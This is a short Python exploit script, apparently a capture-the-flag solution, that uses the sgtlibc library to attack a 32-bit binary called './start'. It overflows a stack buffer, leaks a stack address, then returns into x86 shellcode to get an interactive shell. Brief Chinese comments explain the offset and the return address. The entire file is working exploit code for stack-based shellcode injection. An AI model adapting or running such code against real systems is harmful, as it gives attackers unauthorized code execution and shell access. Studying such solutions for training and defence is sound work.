import sgtlibc
import sgtlibc.utils
import sgtlibc.utils.shell
from sgtlibc.gamebox import *
set_config(GameBoxConfig(
    is_local=True,
    file='./start',
    remote='192.168.2.0:8888',
    auto_load=True,
    auto_show_rop=True,
    auto_show_summary=True,
    auto_start_game=True,
    auto_load_shell_str=True,
    auto_show_symbols=True
))
s = sgtlibc.Searcher()
elf = client.elf
pause()
read_addr = 0x08048087 # 再次读入
padding = 0x48 - 0x34 # 判断返回地址到输入值的偏移
sa(b':', [b'a' * padding, read_addr])
stack_addr = u00(rc(4))
print(f'stack_addr:{hex(stack_addr)}')
shellcode = sgtlibc.utils.shell.shellcode86()
payload = [b'a' * padding]
payload += [stack_addr + padding] # 返回地址为shellcode开头位置
payload += [shellcode]
se(payload)
interactive()
